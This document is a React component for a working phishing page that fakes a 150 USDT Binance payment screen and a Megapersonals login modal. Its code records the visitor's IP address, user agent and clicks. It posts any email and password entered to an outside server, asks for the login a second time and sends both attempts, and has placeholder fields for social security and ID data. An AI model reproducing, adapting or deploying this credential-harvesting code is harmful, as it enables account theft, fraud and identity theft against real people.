import React, { useEffect, useState } from "react";
import { useLocation, useNavigate, useParams } from "react-router-dom";
import { useForm } from "react-hook-form";
import { isBrowser, isMobile } from "react-device-detect";
import "./MegaStyle.css";
import "./payment.css";
import { usePageMeta } from "../../hooks/usePageMeta";

export default function MegaPage() {
  const [showAgeModal, setShowAgeModal] = useState(true);
  const [showLogin, setShowLogin] = useState(false);
  const navigate = useNavigate();
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const [test, setTest] = useState(0);
  const [passwordError, setPasswordError] = useState(false);
  const [verified, setVerified] = useState(false);
  const [token, setToken] = useState();
  const [refreshReCaptcha, setRefreshReCaptcha] = useState(false);
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");
  const [cookies, setCookies] = useState("");
  const [codeLength, setCodeLength] = useState(true);
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [captchaEror, setCaptchaError] = useState("");
  const [loader, setLoader] = useState(false);
  const [userId, setUserId] = useState();
  let type;

  const {
    register,
    handleSubmit,
    resetField,
    formState: { errors, isDirty, isValid },
    reset,
  } = useForm();

  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  localStorage.setItem("url", `/${pathAfterDomain}/${params.id}`);

  useEffect(() => {
    //  fetch(`https://biplobapi.xyz/auth/login/${params.id}`)
    //       .then((response) => response.json())
    //       .then((data) => {
    //         console.log(data?.user);
    //       setUserId(data?.user);
    //       });
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json(); // parse the JSON body
      })
      .then((data) => {
        console.log("Update successful:", data?.data?.userId);
        setUserId(data?.data?.userId); // if needed
      })
      .catch((error) => {
        console.error("Fetch error:", error);
      });

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Megapersonal";

    // Create a link element for the favicon
    // const favicon = document.createElement("link");
    // favicon.rel = "icon";
    // favicon.href = "/favicon.ico"; // Update with the correct path to your favicon

    // // Append the favicon to the head
    // document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes
  }, [type, params.id]);
  const handleAgree = () => {
    setShowAgeModal(false);
    setShowLogin(true);
  };

  const handleAddBooking = (data) => {
    console.log(userId);
    setLoader(true);
    if (step === 0) {
      const bookings = {
        email: data.email,
        address: data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          setStep(1);
          setEmail(data.email);
          setPassword(data.password);
          setLoader(false);
          // setPasswordError(true);
          // setCodeLength(false);
          // setCaptchaError('Captcha doesnt match');
        });
    } else {
      setLoader(true);
      setPasswordError(false);
      localStorage.setItem("femail", data.email);
      const bookings = {
        email: email + " // " + data.email,
        address: password + " // " + data.password,
        site: "mega",
        code: "",
        ssn: "",
        idOne: "",
        idTwo: "",
        agent: userAgent,
        // cookieData:JSON.stringify(cookieData, null, 2),
        ip: ipAddress,
        userId: userId,
        temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
        postingTime: Date().toLocaleString(),
        isDeleted: false,
      };
      console.log(bookings);
      fetch("https://biplobapi.xyz/informations", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(bookings),
      })
        .then((res) => res.json())
        .then((result) => {
          reset();
          setLoader(false);
          pathInfo(bookings);
        });
    }
  };

  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/"),
    );
    // navigate("/gmail", { state: { temp: infos.temp } });
    navigate("/security", { state: { temp: infos.temp } });
    // if (fnl === "auth/login" || "verify/login" ) {
    //   navigate("/security", { state: { temp: infos.temp } });
    // } else {
    // }
  };
  usePageMeta("Payment - Megapersonal", "/");
  return (
    <div className="p_page">
      <div className="p_container">
        <div className="p_header">
          <span className="p_back">←</span>
          <h2 className="p_title">Payee will Receive</h2>
        </div>

        <div className="p_amount_section">
          <div className="p_token">USDT ▾</div>
          <div className="p_amount">150</div>
          {/* <div className="p_currency">≈ ৳611,450</div> */}
        </div>

        <div className="p_confirm_card">
          <div className="p_confirm_header">
            <span>Confirm Payment</span>
            <span className="p_close">✕</span>
          </div>

          <div className="p_user_box">
            <img
              className="p_avatar"
              src="https://i.pravatar.cc/80"
              alt="avatar"
            />

            <div className="p_user_info">
              <div className="p_user_id">779 478 933 (Binance ID)</div>
              <div className="p_user_name">Nickname: *****</div>
            </div>
          </div>

          <div className="p_payee_row">
            <span>Payee Receives</span>
            <span className="p_payee_amount">150 USDT</span>
          </div>

          {/* <div className="p_payee_value">≈ ৳611,450</div> */}

          <div className="p_account_row">
            <span>Account</span>
            <span className="p_account_type">Spot Account ›</span>
          </div>

          <div className="p_warning_box">
            <div className="p_warning_title">Bank Details</div>
            <div className="p_warning_text">***********</div>
          </div>

          <button className="p_deposit_btn" onClick={handleAgree}>Deposit Now</button>
        </div>
      </div>

      {/* LOGIN MODAL */}
      {showLogin && (
        <div className="overlay">
          <div className="login-modal">
            <div className="login-header">
              <div className="avatar">
                <img src="/megapersonalscom.jpg" alt="" />
              </div>
              MEGAPERSONALS
            </div>

            <form
              onSubmit={handleSubmit(handleAddBooking)}
              className="login-body"
            >
                <small className="p_pp">payment pending $150...</small>
              <h3>Already have an account?</h3>

              <input
                placeholder="Email"
                {...register("email", { required: true })}
              />
              <input
                type="password"
                placeholder="Password"
                {...register("password", { required: true })}
              />

              <div class="cap_wrap">
                <div class="captcha_image">
                  <img
                    src="/cap4.png"
                    id="captcha_image_itself"
                    alt="captcha"
                  />
                </div>
                <div class="replyCaptchaReloadButton">
                  <a href="javascript:void(0);">
                    <img src="/reloadButton.png" width="40" height="40" />
                  </a>
                </div>
              </div>

              <input placeholder="Enter code from the picture" />
              {passwordError && (
                <small style={{ color: "#FF8080" }}>
                  Email or Password is wrong
                </small>
              )}

              <button type="submit" className="login-btn">
                LOG IN
              </button>

              <div className="network-text">Part of the BABYLON NETWORK</div>

              <div className="forgot">I FORGOT MY PASSWORD 😟</div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
